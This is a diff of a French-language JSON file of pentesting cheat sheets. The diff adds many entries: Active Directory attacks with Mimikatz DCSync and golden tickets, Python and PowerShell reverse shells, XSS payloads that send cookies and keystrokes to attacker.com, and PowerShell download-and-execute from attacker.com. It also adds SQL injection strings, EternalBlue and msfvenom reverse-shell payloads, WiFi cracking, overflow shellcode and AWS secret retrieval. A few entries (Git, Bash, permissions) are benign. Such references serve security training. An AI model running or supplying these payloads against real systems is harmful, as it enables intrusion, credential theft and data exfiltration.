@@ -1,57 +1,191 @@
 [
   {
-    "id": 1,
     "titre": "Privilege Escalation Linux",
     "description": "Guide complet de l'escalade de privilèges sous Linux",
     "categorie": "Linux",
     "niveau": "Avancé",
     "contenu": "# Privilege Escalation Linux\n\n## 1. Information Gathering\nuname -a\nid\nsudo -l\ncat /etc/sudoers\nfind / -perm -4000 -ls 2>/dev/null\n\n## 2. SUID Binaries\nfind / -type f -perm -u=s 2>/dev/null\nstrings /usr/bin/something\nstrace -e trace=execve /usr/bin/something\n\n## 3. Kernel Exploits\nuname -r\ncat /proc/version\n\n## 4. Sudo Exploitation\nsudo -l\nsudo -u user command\n\n## 5. NOPASSWD Exploitation\ngrep -r NOPASSWD /etc/sudoers\n\n## 6. Path Exploitation\necho $PATH\nls -la /usr/local/bin\n\n## 7. Weak File Permissions\nfind / -type f -perm 0777 2>/dev/null\nfind / -type d -perm 0777 2>/dev/null\n\n## 8. Cron Jobs\ncat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/",
     "commandes": ["sudo", "find", "chmod", "cat", "strings", "strace"],
-    "ressources": ["https://github.com/swisskyrepo/PayloadsAllTheThings", "https://gtfobins.github.io/"],
-    "date_creation": "2025-11-05"
+    "ressources": "https://github.com/swisskyrepo/PayloadsAllTheThings"
   },
   {
-    "id": 2,
     "titre": "Web Penetration Testing",
     "description": "Cheat sheet pour les tests de pénétration web",
     "categorie": "Web",
     "niveau": "Intermédiaire",
-    "contenu": "# Web Penetration Testing\n\n## OWASP Top 10 Reconnaissance\n\n### 1. Reconnaissance\nwhois domain.com\nnmap -sV -sC domain.com\nwhatweb domain.com\ngoogle dorking: site:domain.com\n\n### 2. Scanning\nnikto -h domain.com\nburpsuite\nzaproxy\nnessus\n\n### 3. SQL Injection\nsqlmap -u \"http://site.com/page?id=1\" --dbs\nsqlmap -u \"http://site.com/page?id=1\" --dump\n' OR '1'='1\nadmin' OR '1'='1' --\n\n### 4. XSS Testing\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n\n### 5. CSRF Testing\n<img src=\"http://site.com/action?param=value\">\n\n### 6. Directory Enumeration\ndirbuster\ngobuster dir -u http://site.com -w wordlist.txt\nffuf -u http://site.com/FUZZ -w wordlist.txt\n\n### 7. Parameter Fuzzing\nburpsuite intruder\nsqlmap -u \"http://site.com/page?id=1\" -p id\n\n### 8. Authentication Bypass\ndefault credentials\nby passing login\ntoken manipulation",
-    "commandes": ["nikto", "burpsuite", "sqlmap", "nmap", "whawhatseb", "dirb"],
-    "ressources": ["https://owasp.org/www-project-web-security-testing-guide/", "https://owasp.org/www-project-top-ten/"],
-    "date_creation": "2025-11-05"
+    "contenu": "# Web Penetration Testing\n\n## OWASP Top 10\n\n### 1. Reconnaissance\nwhois domain.com\nnmap -sV -sC domain.com\nwhatweb domain.com\n\n### 2. SQL Injection\nsqlmap -u \"http://site.com/page?id=1\" --dbs\n' OR '1'='1\nadmin' OR '1'='1' --\n\n### 3. XSS Testing\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n\n### 4. CSRF Testing\n<img src=\"http://site.com/action?param=value\">\n\n### 5. Directory Enumeration\ngobuster dir -u http://site.com -w wordlist.txt\nffuf -u http://site.com/FUZZ -w wordlist.txt\n\n### 6. Authentication Bypass\ndefault credentials\ntoken manipulation\n\n### 7. File Upload\nmultiple extensions\nmagic bytes bypass\n\n### 8. Security Headers\ncurl -I http://site.com\nX-Frame-Options\nContent-Security-Policy",
+    "commandes": ["nikto", "burpsuite", "sqlmap", "nmap", "whatweb", "dirb"],
+    "ressources": "https://owasp.org/www-project-web-security-testing-guide/"
   },
   {
-    "id": 3,
     "titre": "Bash Scripting Essentials",
     "description": "Commandes bash essentielles pour l'automatisation",
     "categorie": "Scripting",
     "niveau": "Débutant",
-    "contenu": "# Bash Scripting\n\n## Variables\nVAR=\"value\"\necho $VAR\nreadonly VAR\nunset VAR\n\n## Paramètres\n$0 - nom du script\n$1, $2, etc - arguments\n$# - nombre d'arguments\n$@ - tous les arguments\n$? - code de retour\n\n## Boucles For\nfor i in {1..10}; do echo $i; done\nfor file in *.txt; do cat $file; done\nfor ((i=0; i<10; i++)); do echo $i; done\n\n## Boucles While\nwhile [ condition ]; do command; done\nwhile read line; do echo $line; done < file.txt\n\n## Conditions\nif [ $var -eq 5 ]; then\n  echo \"Equal\"\nfi\n\n[ $a -lt $b ] - moins que\n[ $a -gt $b ] - plus que\n[ $a -eq $b ] - égal\n[ $a -ne $b ] - différent\n[ -f file ] - fichier existe\n[ -d dir ] - répertoire existe\n\n## Fonctions\nfunction_name() {\n  echo \"Hello\"\n  return 0\n}\n\nfunction my_func() {\n  local var=\"local value\"\n  return $1\n}\n\n## Substitution de Commande\nresult=$(command)\nresult=`command`\n\n## Pipes et Redirections\ncommand1 | command2\ncommand > file\ncommand >> file\ncommand < file\ncommand 2>&1",
+    "contenu": "# Bash Scripting\n\n## Variables\nVAR=\"value\"\necho $VAR\nreadonly VAR\nunset VAR\n\n## Paramètres\n$0 - nom du script\n$1, $2, etc - arguments\n$# - nombre d'arguments\n$@ - tous les arguments\n$? - code de retour\n\n## Boucles\nfor i in {1..10}; do echo $i; done\nfor file in *.txt; do cat $file; done\nwhile [ condition ]; do command; done\n\n## Conditions\nif [ $var -eq 5 ]; then\n  echo \"Equal\"\nfi\n[ -f file ] - fichier existe\n[ -d dir ] - répertoire existe\n\n## Fonctions\nfunction_name() {\n  echo \"Hello\"\n  return 0\n}\n\n## Redirections\ncommand > file\ncommand >> file\ncommand < file\ncommand 2>&1",
     "commandes": ["bash", "sed", "awk", "grep", "cut", "tr", "sort"],
-    "ressources": ["https://www.gnu.org/software/bash/manual/", "https://www.shellscript.sh/"],
-    "date_creation": "2025-11-05"
+    "ressources": "https://www.gnu.org/software/bash/manual/"
   },
   {
-    "id": 4,
     "titre": "Windows Privilege Escalation",
     "description": "Techniques d'escalade de privilèges sous Windows",
     "categorie": "Windows",
     "niveau": "Avancé",
-    "contenu": "# Windows Privilege Escalation\n\n## Information Gathering\nwhoami\nwhoami /priv\nwhoami /groups\nsysteminfo\nnetsh wlan show profile\nipconfig /all\nroute print\n\n## Unquoted Service Paths\nwmic service list brief\nwmic service list brief | findstr \"Running\"\nGet-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike '\"*'}\n\n## Weak Folder Permissions\nicacls C:\\Program Files\\*\n\n## Registry Modification\nreg query HKLM\\System\\CurrentControlSet\\Services\nreg add HKCU\\Software\\Microsoft\\Windows\\Run /v malware /d C:\\path\\malware.exe\n\n## UAC Bypass\nBypassUAC.exe\nWINDIR% \\System32\\wusa.exe /extract:C:\\temp /quiet\n\n## Token Impersonation\nIncognito.exe list_tokens -u\nincognito.exe delegate_tokens\n\n## Scheduled Tasks\ntasklist /V\ntasksched.msc\nschtasks /query /fo LIST /v\n\n## DLL Hijacking\nProcess Monitor (procmon.exe)\nFind DLL's in user writable directories\n\n## Kernel Exploits\nwmic os get version\nwmic os get buildnumber",
+    "contenu": "# Windows Privilege Escalation\n\n## Information Gathering\nwhoami\nwhoami /priv\nwhoami /groups\nsysteminfo\nipconfig /all\n\n## Unquoted Service Paths\nwmic service list brief\nGet-WmiObject win32_service\n\n## Weak Folder Permissions\nicacls C:\\Program Files\\*\n\n## Registry Modification\nreg query HKLM\\System\nreg add HKCU\\Software\\Microsoft\\Windows\\Run\n\n## UAC Bypass\nBypassUAC.exe\n\n## Token Impersonation\nIncognito.exe list_tokens -u\n\n## Scheduled Tasks\ntasklist /V\ntasksched.msc\nschtasks /query /fo LIST /v\n\n## Kernel Exploits\nwmic os get version\nwmic os get buildnumber",
     "commandes": ["whoami", "systeminfo", "icacls", "reg", "wmic", "tasklist"],
-    "ressources": ["https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Windows%20-%20Privilege%20Escalation", "https://github.com/gtworek/Priv2Admin"],
-    "date_creation": "2025-11-05"
+    "ressources": "https://github.com/swisskyrepo/PayloadsAllTheThings"
   },
   {
-    "id": 5,
     "titre": "Network Reconnaissance",
     "description": "Techniques de reconnaissance réseau",
     "categorie": "Réseau",
     "niveau": "Intermédiaire",
-    "contenu": "# Network Reconnaissance\n\n## Ping Sweep\nfor i in {1..254}; do ping -c 1 192.168.1.$i | grep \"bytes from\" & done\nnmap -sn 192.168.1.0/24\n\n## DNS Enumeration\nnslookup domain.com\nnslookup -query=MX domain.com\nnslookup -query=NS domain.com\ndig domain.com\ndig domain.com ANY\ndig domain.com @ns.domain.com\n\n## Zone Transfer\nnslookup -ls -d domain.com ns.domain.com\ndig domain.com @ns.domain.com AXFR\ndig domain.com +long +noall +answer\n\n## Whois\nwhois domain.com\nwhois IP\n\n## Port Scanning\nnmap -p- target\nnmap -sT target\nnmap -sS target\nnmap -sU target\nnmap -sV target\n\n## Service Detection\nbannergrabing\nnetcat -v target port\ntelnet target port\n\n## Traceroute\ntraceroute domain.com\ntracert domain.com (Windows)\nmtr domain.com\n\n## Reverse DNS Lookup\nnslookup IP\ndig -x IP\n\n## Network Mapping\nnmap -A target\nnmap -O target\nnmap --script discovery target",
+    "contenu": "# Network Reconnaissance\n\n## Ping Sweep\nfor i in {1..254}; do ping -c 1 192.168.1.$i & done\nnmap -sn 192.168.1.0/24\n\n## DNS Enumeration\nnslookup domain.com\ndig domain.com\ndig domain.com ANY\n\n## Whois\nwhois domain.com\nwhois IP\n\n## Port Scanning\nnmap -p- target\nnmap -sT target\nnmap -sS target\nnmap -sV target\n\n## Service Detection\nnetcat -v target port\ntelnet target port\n\n## Traceroute\ntraceroute domain.com\nmtr domain.com\n\n## Reverse DNS\nnslookup IP\ndig -x IP\n\n## Network Mapping\nnmap -A target\nnmap -O target",
     "commandes": ["nmap", "dig", "nslookup", "whois", "traceroute", "ping"],
-    "ressources": ["https://nmap.org/book/", "https://www.dns-sd.org/"],
-    "date_creation": "2025-11-05"
+    "ressources": "https://nmap.org/book/"
+  },
+  {
+    "titre": "Active Directory Enumeration",
+    "description": "Énumération Active Directory et techniques d'attaque",
+    "categorie": "Windows",
+    "niveau": "Avancé",
+    "contenu": "# Active Directory Enumeration\n\n## Domain Enumeration\nGet-ADDomain\nGet-ADForest\nGet-ADUser -Filter *\nGet-ADGroup -Filter *\nGet-ADComputer -Filter *\n\n## PowerView\nImport-Module PowerView.ps1\nGet-NetDomain\nGet-NetUser\nGet-NetGroup\nGet-NetComputer\n\n## BloodHound\nsharpHound.exe -c All\nInvoke-BloodHound -CollectionMethod All\n\n## Kerberoasting\nGet-DomainSPNTicket\nInvoke-Kerberoast\nrubeus.exe kerberoast\n\n## AS-REP Roasting\nGet-ASRepHash\nrubeus.exe asreproast\n\n## DCSync Attack\nInvoke-Mimikatz -Command 'lsadump::dcsync /domain:domain.com'\n\n## Pass-the-Hash\npth-winexe -U domain/user%hash //target cmd\n\n## Golden Ticket\nInvoke-Mimikatz -Command 'kerberos::golden'",
+    "commandes": ["PowerView", "BloodHound", "Mimikatz", "Rubeus", "Impacket"],
+    "ressources": "https://adsecurity.org/"
+  },
+  {
+    "titre": "Docker Security",
+    "description": "Sécurité des containers Docker",
+    "categorie": "Linux",
+    "niveau": "Intermédiaire",
+    "contenu": "# Docker Security\n\n## Container Escape\ndocker run --privileged\ndocker run -v /:/host\nmount /dev/sda1 /mnt\n\n## Image Analysis\ndocker images\ndocker inspect image\ndocker history image\ndive image\n\n## Network Analysis\ndocker network ls\ndocker network inspect bridge\n\n## Volume Analysis\ndocker volume ls\ndocker volume inspect volume\n\n## Container Enumeration\ndocker ps -a\ndocker inspect container\ndocker logs container\ndocker exec -it container bash\n\n## Dockerfile Security\nUSER nonroot\nRUN apt-get update && apt-get upgrade\nCOPY --chown=nonroot:nonroot\nHEALTHCHECK --interval=30s\n\n## Docker Socket Exploitation\ndocker -H unix:///var/run/docker.sock run -v /:/host -it alpine\n\n## Registry Enumeration\ndocker search term\ncurl http://registry:5000/v2/_catalog",
+    "commandes": ["docker", "dive", "trivy", "clair", "anchore"],
+    "ressources": "https://docs.docker.com/engine/security/"
+  },
+  {
+    "titre": "Python for Pentesting",
+    "description": "Scripts Python utiles pour le pentesting",
+    "categorie": "Scripting",
+    "niveau": "Intermédiaire",
+    "contenu": "# Python for Pentesting\n\n## Socket Programming\nimport socket\ns = socket.socket()\ns.connect((host, port))\ns.send(b'data')\ndata = s.recv(1024)\n\n## HTTP Requests\nimport requests\nr = requests.get(url)\nr.status_code\nr.text\n\n## Port Scanner\nfor port in range(1, 1024):\n    sock = socket.socket()\n    result = sock.connect_ex((host, port))\n    if result == 0:\n        print(f'Port {port} is open')\n\n## Subprocess\nimport subprocess\nresult = subprocess.run(['ls', '-la'])\n\n## File Operations\nwith open('file.txt', 'r') as f:\n    content = f.read()\n\n## Base64\nimport base64\nencoded = base64.b64encode(b'data')\n\n## Hashing\nimport hashlib\nhash = hashlib.md5(b'password').hexdigest()\n\n## Reverse Shell\nimport socket, subprocess\ns=socket.socket()\ns.connect(('ip',port))\nos.dup2(s.fileno(),0)\nsubprocess.call(['/bin/sh','-i'])",
+    "commandes": ["python3", "pip", "virtualenv", "requests", "scapy"],
+    "ressources": "https://docs.python.org/3/"
+  },
+  {
+    "titre": "SQL Injection Cheat Sheet",
+    "description": "Techniques d'injection SQL",
+    "categorie": "Web",
+    "niveau": "Intermédiaire",
+    "contenu": "# SQL Injection\n\n## Detection\n' OR '1'='1\n' OR '1'='1' --\n' OR '1'='1' /*\nadmin' --\n\n## Union Based\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT username,password FROM users--\n\n## Error Based\n' AND 1=CONVERT(int,(SELECT @@version))--\n' AND 1=CAST((SELECT @@version) AS int)--\n\n## Boolean Based\n' AND 1=1--\n' AND 1=2--\n' AND SUBSTRING((SELECT password FROM users),1,1)='a'--\n\n## Time Based\n' AND SLEEP(5)--\n' AND IF(1=1,SLEEP(5),0)--\n\n## Database Enumeration\n' UNION SELECT table_name FROM information_schema.tables--\n' UNION SELECT column_name FROM information_schema.columns--\n\n## Bypasses\n' OR 1=1--\n' OR 'x'='x\nadmin'--\n/**/OR/**/1=1",
+    "commandes": ["sqlmap", "burpsuite", "curl", "python"],
+    "ressources": "https://portswigger.net/web-security/sql-injection"
+  },
+  {
+    "titre": "XSS Payloads",
+    "description": "Cross-Site Scripting payloads et techniques",
+    "categorie": "Web",
+    "niveau": "Débutant",
+    "contenu": "# XSS Payloads\n\n## Basic\n<script>alert('XSS')</script>\n<script>alert(document.cookie)</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n\n## Cookie Stealing\n<script>document.location='http://attacker.com/?c='+document.cookie</script>\n<script>new Image().src='http://attacker.com/?c='+document.cookie</script>\n\n## Keylogger\n<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>\n\n## Bypasses\n<scr<script>ipt>alert('XSS')</scr</script>ipt>\n<img src=x onerror=\"alert`XSS`\">\n<svg><script>alert`XSS`</script></svg>\n\n## Filter Evasion\n<img src=x onerror=\\u0061lert('XSS')>\n<img src=x onerror=\\x61lert('XSS')>\n\n## DOM XSS\n<script>eval(location.hash.slice(1))</script>\n\n## Polyglot\njaVasCript:alert('XSS')",
+    "commandes": ["burpsuite", "xsser", "beef", "xsshunter"],
+    "ressources": "https://portswigger.net/web-security/cross-site-scripting"
+  },
+  {
+    "titre": "Metasploit Framework",
+    "description": "Guide d'utilisation de Metasploit",
+    "categorie": "Linux",
+    "niveau": "Intermédiaire",
+    "contenu": "# Metasploit Framework\n\n## Basic Commands\nmsfconsole\nshow exploits\nshow payloads\nshow auxiliary\nset OPTION value\nrun\n\n## Search\nsearch type:exploit platform:windows\nsearch cve:2017\n\n## Exploit\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOST target\nset LHOST attacker\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit\n\n## Meterpreter\nsysinfo\ngetuid\nps\nmigrate PID\nhashdump\nscreenshot\nkeyscan_start\nshell\n\n## Post Exploitation\nrun post/windows/gather/hashdump\nrun post/windows/gather/enum_applications\nrun post/windows/escalate/getsystem\n\n## Payload Generation\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe > shell.exe\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw > shell.php",
+    "commandes": ["msfconsole", "msfvenom", "meterpreter"],
+    "ressources": "https://docs.metasploit.com/"
+  },
+  {
+    "titre": "Wireless Hacking",
+    "description": "Techniques de hacking WiFi",
+    "categorie": "Réseau",
+    "niveau": "Avancé",
+    "contenu": "# Wireless Hacking\n\n## Monitor Mode\nairmon-ng start wlan0\niwconfig wlan0 mode monitor\n\n## Network Discovery\nairodump-ng wlan0mon\nwash -i wlan0mon\n\n## WPA/WPA2 Cracking\nairodump-ng -c channel --bssid MAC -w capture wlan0mon\naireplay-ng --deauth 10 -a MAC wlan0mon\naircrack-ng -w wordlist.txt capture.cap\n\n## WPS Attacks\nreaver -i wlan0mon -b MAC -vv\nbully wlan0mon -b MAC -c channel\n\n## Evil Twin Attack\nairbase-ng -e \"FreeWiFi\" -c 6 wlan0mon\n\n## Deauth Attack\naireplay-ng --deauth 0 -a BSSID wlan0mon\n\n## Handshake Capture\nairodump-ng -c channel --bssid MAC -w capture wlan0mon\n\n## Cracking\nhashcat -m 2500 capture.hccapx wordlist.txt",
+    "commandes": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng", "reaver"],
+    "ressources": "https://www.aircrack-ng.org/"
+  },
+  {
+    "titre": "Buffer Overflow Basics",
+    "description": "Introduction aux buffer overflows",
+    "categorie": "Linux",
+    "niveau": "Avancé",
+    "contenu": "# Buffer Overflow\n\n## Fuzzing\npython -c 'print \"A\" * 1000' | ./vulnerable\nfor i in {1..10000}; do echo \"A\" | ./vulnerable; done\n\n## Pattern Creation\npattern_create.rb -l 1000\nmsf-pattern_create -l 1000\n\n## Pattern Offset\npattern_offset.rb -q 0x41414141\n\n## GDB Commands\ngdb ./vulnerable\nrun $(python -c 'print \"A\" * 1000')\ninfo registers\nx/100x $esp\n\n## Badchars Detection\nbadchars = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\"\n\n## Shellcode\nshellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\"\n\n## Exploit\nbuffer = \"A\" * offset\nbuffer += \"\\xef\\xbe\\xad\\xde\"\nbuffer += \"\\x90\" * 16\nbuffer += shellcode",
+    "commandes": ["gdb", "immunity", "mona", "pattern_create", "msfvenom"],
+    "ressources": "https://github.com/justinsteven/dostackbufferoverflowgood"
+  },
+  {
+    "titre": "Git Commands",
+    "description": "Commandes Git essentielles",
+    "categorie": "Scripting",
+    "niveau": "Débutant",
+    "contenu": "# Git Commands\n\n## Basic\ngit init\ngit clone URL\ngit status\ngit add file\ngit add .\ngit commit -m \"message\"\ngit push origin main\ngit pull origin main\n\n## Branches\ngit branch\ngit branch new-branch\ngit checkout branch-name\ngit checkout -b new-branch\ngit merge branch-name\n\n## Remote\ngit remote -v\ngit remote add origin URL\ngit fetch origin\n\n## History\ngit log\ngit log --oneline\ngit diff\n\n## Undo\ngit reset HEAD file\ngit reset --hard HEAD\ngit revert commit\ngit checkout -- file\n\n## Stash\ngit stash\ngit stash list\ngit stash apply\ngit stash pop\n\n## Tags\ngit tag v1.0\ngit tag -a v1.0 -m \"Version 1.0\"\ngit push origin v1.0",
+    "commandes": ["git", "github", "gitlab"],
+    "ressources": "https://git-scm.com/doc"
+  },
+  {
+    "titre": "Reverse Engineering Tools",
+    "description": "Outils et techniques de reverse engineering",
+    "categorie": "Linux",
+    "niveau": "Avancé",
+    "contenu": "# Reverse Engineering\n\n## Static Analysis\nfile binary\nstrings binary\nobjdump -d binary\nobjdump -M intel -d binary\nreadelf -a binary\nnm binary\n\n## Dynamic Analysis\nstrace ./binary\nltrace ./binary\ngdb ./binary\n\n## Ghidra\nghidraRun\nFile > Import File\nAnalyze\nWindow > Decompile\n\n## Radare2\nr2 binary\naaa\nafl\npdf @ main\nVV @ main\n\n## IDA Pro\nFile > Open\nView > Open Subviews > Functions\nF5 (decompile)\n\n## Debugging\nbreakpoint\nstep\nnext\ncontinue\nprint variable\n\n## Patching\npr2 binary\ns main\nwao nop\nwt patched\n\n## Unpacking\nupx -d packed.exe",
+    "commandes": ["ghidra", "radare2", "ida", "gdb", "objdump", "strings"],
+    "ressources": "https://ghidra-sre.org/"
+  },
+  {
+    "titre": "OSINT Techniques",
+    "description": "Open Source Intelligence gathering",
+    "categorie": "Réseau",
+    "niveau": "Débutant",
+    "contenu": "# OSINT Techniques\n\n## Search Engines\nsite:target.com\nfiletype:pdf site:target.com\nintitle:\"index of\" site:target.com\ninurl:admin site:target.com\n\n## Subdomain Enumeration\nsublist3r -d target.com\namass enum -d target.com\nsubfinder -d target.com\n\n## Email Harvesting\ntheHarvester -d target.com -b google\nhunter.io\n\n## Social Media\nsherlock username\nmaigret username\n\n## DNS Information\nwhois target.com\ndig target.com ANY\nnslookup target.com\n\n## IP Information\niplocation.net\nshodan.io\ncensys.io\n\n## Metadata Extraction\nexiftool document.pdf\nmetagoofil -d target.com -t pdf\n\n## Archive Search\narchive.org/web/\nwaybackmachine",
+    "commandes": ["theHarvester", "sublist3r", "amass", "sherlock", "exiftool"],
+    "ressources": "https://osintframework.com/"
+  },
+  {
+    "titre": "Cryptography Basics",
+    "description": "Concepts de base en cryptographie",
+    "categorie": "Scripting",
+    "niveau": "Intermédiaire",
+    "contenu": "# Cryptography\n\n## Hashing\necho -n \"password\" | md5sum\necho -n \"password\" | sha256sum\necho -n \"password\" | sha512sum\n\n## Symmetric Encryption\nopenssl enc -aes-256-cbc -in file.txt -out encrypted.bin\nopenssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt\n\n## Asymmetric Encryption\nopenssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -outform PEM -pubout -out public.pem\n\n## Base64\necho \"data\" | base64\necho \"ZGF0YQ==\" | base64 -d\n\n## ROT13\necho \"hello\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n## Certificate\nopenssl req -new -x509 -days 365 -keyout server.key -out server.crt\nopenssl x509 -in certificate.crt -text -noout\n\n## Password Cracking\njohn --wordlist=rockyou.txt hashes.txt\nhashcat -m 0 hashes.txt wordlist.txt\n\n## Random Data\nopenssl rand -base64 32",
+    "commandes": ["openssl", "john", "hashcat", "gpg"],
+    "ressources": "https://www.openssl.org/docs/"
+  },
+  {
+    "titre": "Linux File Permissions",
+    "description": "Gestion des permissions sous Linux",
+    "categorie": "Linux",
+    "niveau": "Débutant",
+    "contenu": "# Linux File Permissions\n\n## Permissions\nls -la\nchmod 755 file\nchmod u+x file\nchmod g-w file\nchmod o+r file\n\n## Ownership\nchown user:group file\nchown user file\nchgrp group file\n\n## Special\nchmod 4755 file  # SUID\nchmod 2755 file  # SGID\nchmod 1777 file  # Sticky bit\n\n## Find SUID/SGID\nfind / -perm -4000 2>/dev/null\nfind / -perm -2000 2>/dev/null\nfind / -perm -6000 2>/dev/null\n\n## ACL\ngetfacl file\nsetfacl -m u:user:rwx file\nsetfacl -x u:user file\n\n## Umask\numask\numask 022\n\n## Notation\nr = 4\nw = 2\nx = 1\nrwx = 7\nrw- = 6\nr-x = 5\nr-- = 4",
+    "commandes": ["chmod", "chown", "chgrp", "getfacl", "setfacl", "umask"],
+    "ressources": "https://wiki.archlinux.org/title/File_permissions_and_attributes"
+  },
+  {
+    "titre": "AWS Security",
+    "description": "Sécurité AWS et pentesting cloud",
+    "categorie": "Réseau",
+    "niveau": "Avancé",
+    "contenu": "# AWS Security\n\n## Enumeration\naws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws s3 ls\naws ec2 describe-instances\n\n## S3 Buckets\naws s3 ls s3://bucket-name\naws s3 cp s3://bucket-name/file .\naws s3 sync s3://bucket-name .\naws s3 mb s3://new-bucket\n\n## IAM\naws iam get-user\naws iam list-attached-user-policies --user-name user\n\n## EC2\naws ec2 describe-instances\naws ec2 describe-security-groups\naws ec2 describe-snapshots\n\n## Lambda\naws lambda list-functions\naws lambda get-function --function-name name\n\n## Secrets Manager\naws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id name\n\n## CloudTrail\naws cloudtrail lookup-events\n\n## Escalation\naws iam create-access-key --user-name admin",
+    "commandes": ["awscli", "pacu", "cloudfox", "prowler"],
+    "ressources": "https://docs.aws.amazon.com/cli/"
+  },
+  {
+    "titre": "API Security Testing",
+    "description": "Tests de sécurité des API REST",
+    "categorie": "Web",
+    "niveau": "Intermédiaire",
+    "contenu": "# API Security Testing\n\n## Enumeration\ncurl -X GET http://api.example.com/users\ncurl -X GET http://api.example.com/v1/users\n\n## Authentication\ncurl -X POST http://api.example.com/login\ncurl -H \"Authorization: Bearer TOKEN\" http://api.example.com/users\ncurl -H \"X-API-Key: KEY\" http://api.example.com/users\n\n## HTTP Methods\ncurl -X GET http://api.example.com/users/1\ncurl -X POST http://api.example.com/users\ncurl -X PUT http://api.example.com/users/1\ncurl -X DELETE http://api.example.com/users/1\ncurl -X PATCH http://api.example.com/users/1\n\n## IDOR Testing\ncurl http://api.example.com/users/1\ncurl http://api.example.com/users/2\n\n## Mass Assignment\ncurl -X POST http://api.example.com/users -d '{\"name\":\"test\",\"role\":\"admin\"}'\n\n## Rate Limiting\nfor i in {1..1000}; do curl http://api.example.com/users; done\n\n## SQL Injection\ncurl \"http://api.example.com/users?id=1' OR '1'='1\"\n\n## XXE\ncurl -X POST --data '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>'",
+    "commandes": ["curl", "postman", "burpsuite", "ffuf", "arjun"],
+    "ressources": "https://owasp.org/www-project-api-security/"
+  },
+  {
+    "titre": "PowerShell for Pentesting",
+    "description": "Scripts PowerShell pour le pentesting",
+    "categorie": "Windows",
+    "niveau": "Intermédiaire",
+    "contenu": "# PowerShell for Pentesting\n\n## Basic\nGet-Command\nGet-Help command\nGet-Process\nGet-Service\nGet-NetIPAddress\n\n## Files\nGet-ChildItem -Path C:\\ -Recurse\nGet-Content file.txt\nSet-Content file.txt \"data\"\nCopy-Item source dest\nRemove-Item file.txt\n\n## Network\nTest-NetConnection target -Port 80\nInvoke-WebRequest http://target.com\nResolve-DnsName target.com\n\n## Download & Execute\nIEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')\n\n## PowerView\nImport-Module PowerView.ps1\nGet-NetDomain\nGet-NetUser\n\n## Mimikatz\nInvoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'\n\n## Reverse Shell\n$client = New-Object System.Net.Sockets.TCPClient('attacker',4444)\n$stream = $client.GetStream()\n\n## Bypass\npowershell -ExecutionPolicy Bypass -File script.ps1",
+    "commandes": ["powershell", "PowerView", "PowerUp", "Invoke-Mimikatz"],
+    "ressources": "https://docs.microsoft.com/en-us/powershell/"
   }
 ]
